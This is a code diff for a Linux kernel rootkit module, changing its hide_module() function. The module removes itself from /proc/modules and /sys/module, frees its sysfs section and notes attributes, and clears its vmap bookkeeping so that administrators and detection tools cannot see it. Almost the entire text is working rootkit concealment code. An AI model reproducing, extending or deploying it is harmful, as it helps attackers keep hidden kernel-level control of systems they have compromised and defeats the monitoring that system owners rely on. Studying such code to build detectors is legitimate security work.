@@ -24,17 +24,25 @@ LIST_HEAD(authorized_pids_list);
 
 static task_t *(*_find_get_task_by_vpid)(pid_t nr) = NULL; // Pointer to `find_get_task_by_vpid()`
 
+static struct list_head *p_vma_list = NULL; // Pointer to `vmap_area_list`
+static struct rb_root *p_vma_root   = NULL; // Pointer to `vmap_area_root`
+
 void hide_module(void)
 {
+    unsigned int i = 0;
     struct vmap_area *p_vma;
     struct vmap_area *p_vma_tmp;
     struct module_use *p_use;
     struct module_use *p_use_tmp;
-    struct list_head *p_vma_list;
-    struct rb_root *p_vma_root;
+    struct module_notes_attrs *notes_attrs = NULL;
+    struct module_sect_attrs *sect_attrs   = NULL;
 
-    p_vma_list = (struct list_head *)lookup_name("vmap_area_list");
-    p_vma_root = (struct rb_root *)lookup_name("vmap_area_root");
+    if (p_vma_list == NULL) {
+        p_vma_list = (struct list_head *)lookup_name("vmap_area_list");
+    }
+    if (p_vma_root == NULL) {
+        p_vma_root = (struct rb_root *)lookup_name("vmap_area_root");
+    }
 
     pr_info("[ROOTKIT] p_vma_list: %p\n", p_vma_list);
     pr_info("[ROOTKIT] p_vma_root: %p\n", p_vma_root);
@@ -50,12 +58,6 @@ void hide_module(void)
         }
     }
 
-    // Remove module from /proc/modules
-    list_del(&THIS_MODULE->list);
-
-    // Remove module from /sys/module/
-    kobject_del(&THIS_MODULE->mkobj.kobj);
-
     // Clear dependency list (see kernel/module.c)
     list_for_each_entry_safe (p_use, p_use_tmp, &THIS_MODULE->target_list, target_list) {
         pr_info("[ROOTKIT] * Removing dependency source %p, target %p...", p_use->source->name,
@@ -66,6 +68,49 @@ void hide_module(void)
         kfree(p_use);
         pr_cont(" done\n");
     }
+
+    // Clear notes_attr (see kernel/module.c)
+    notes_attrs = THIS_MODULE->notes_attrs;
+    if (notes_attrs != NULL) {
+        pr_info("[ROOTKIT] * Removing notes_attr %p...", notes_attrs);
+        if (notes_attrs->dir != NULL) {
+            i = THIS_MODULE->notes_attrs->notes;
+            while (i-- > 0) {
+                pr_info("[ROOTKIT]   * Removing attr %u (%p)...", i, &notes_attrs->attrs[i]);
+                sysfs_remove_bin_file(notes_attrs->dir, &notes_attrs->attrs[i]);
+            }
+            kobject_put(notes_attrs->dir);
+        }
+        kfree(notes_attrs);
+        THIS_MODULE->notes_attrs = NULL;
+    }
+
+    // Clear sect_attrs (see kernel/module.c)
+    sect_attrs = THIS_MODULE->sect_attrs;
+    if (sect_attrs != NULL) {
+        pr_info("[ROOTKIT] * Removing sect_attr %p...", sect_attrs);
+        sysfs_remove_group(&THIS_MODULE->mkobj.kobj, &sect_attrs->grp);
+        for (i = 0; i < sect_attrs->nsections; i++) {
+            pr_info("[ROOTKIT]   * Freeing attr %u (%p)...", i, &sect_attrs->attrs[i]);
+            kfree(sect_attrs->attrs[i].battr.attr.name);
+        }
+        kfree(sect_attrs);
+        THIS_MODULE->sect_attrs = NULL;
+    }
+
+    // Clear various fields
+    THIS_MODULE->modinfo_attrs->attr.name = NULL;
+    kfree(THIS_MODULE->mkobj.mp);
+    THIS_MODULE->mkobj.mp = NULL;
+    kfree(THIS_MODULE->mkobj.drivers_dir);
+    THIS_MODULE->mkobj.drivers_dir = NULL;
+
+    // Remove module from /proc/modules
+    list_del(&THIS_MODULE->list);
+
+    // Remove module from /sys/module/
+    kobject_del(&THIS_MODULE->mkobj.kobj);
+    list_del(&THIS_MODULE->mkobj.kobj.entry);
 
     pr_info("[ROOTKIT] Module was hidden\n");
 }
